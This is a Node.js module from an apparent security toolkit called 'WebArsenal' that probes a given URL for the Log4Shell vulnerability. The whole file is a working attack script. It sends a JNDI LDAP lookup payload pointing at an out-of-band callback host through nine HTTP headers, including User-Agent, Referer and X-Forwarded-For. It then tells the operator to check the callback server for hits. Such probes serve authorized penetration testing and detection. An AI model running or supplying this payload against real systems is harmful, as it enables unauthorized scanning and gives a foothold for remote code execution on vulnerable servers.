#!/usr/bin/env node
'use strict';
/**
 * ╔════════════════════════════════════════════════════════════════════════════╗
 * ║ WebArsenal v5.5.0 "Pulse" - Advanced Security Suite                          ║
 * ║ De{c0}ded by Edwin Dev                                                      ║
 * ║ Module: log4shell-probe.js                                                          ║
 * ╚════════════════════════════════════════════════════════════════════════════╝
 */




const axios = require('axios');
const { getModuleById } = require('../lib/module-catalog');
const { parseArgs } = require('../lib/module-runner');
const { HttpHistoryLogger } = require('../utils/http-history-logger');

const definition = getModuleById('infrastructure/log4shell-probe');
const historyLogger = new HttpHistoryLogger();

async function run(argv = process.argv) {
  const { flags } = parseArgs(argv.slice(2));
  const url = flags.url;
  const oastHost = flags.oast || 'oast.example.com';

  if (!url) {
    console.log(`Usage: node ${definition.filePath} --url <target-url> --oast <interactsh-host>`);
    return;
  }

  console.log(`[*] Probing for Log4Shell on ${url} using OAST host: ${oastHost}...`);
  const findings = [];
  const payload = `\${jndi:ldap://${oastHost}/\${hostName}}`;

  const headersToTest = [
    { 'User-Agent': payload },
    { 'Referer': payload },
    { 'X-Forwarded-For': payload },
    { 'Forwarded': payload },
    { 'Contact': payload },
    { 'X-Api-Version': payload },
    { 'X-Client-IP': payload },
    { 'CF-Connecting-IP': payload },
    { 'True-Client-IP': payload }
  ];

  for (const header of headersToTest) {
    try {
      const startTime = Date.now();
      const response = await axios.get(url, {
        headers: header,
        timeout: 10000,
        validateStatus: () => true
      });
      const duration = Date.now() - startTime;

      historyLogger.logRequest({
        tool: definition.id,
        method: 'GET',
        url,
        requestHeaders: header,
        statusCode: response.status,
        responseHeaders: response.headers,
        responseBody: '',
        durationMs: duration
      });
      
      // Since it's a blind probe, we only confirm the injection
      console.log(`[+] INJECTED LOG4SHELL PAYLOAD IN HEADER: ${JSON.stringify(header)}`);
    } catch (err) {
      // Skip
    }
  }

  console.log(`[*] Finished probing ${url}. Check your OAST callback server (${oastHost}) for any hits.`);
  return { status: 'ok', note: 'Log4Shell probes injected. Check OAST for results.' };
}

if (require.main === module) {
  run().catch(console.error);
}

module.exports = { run };
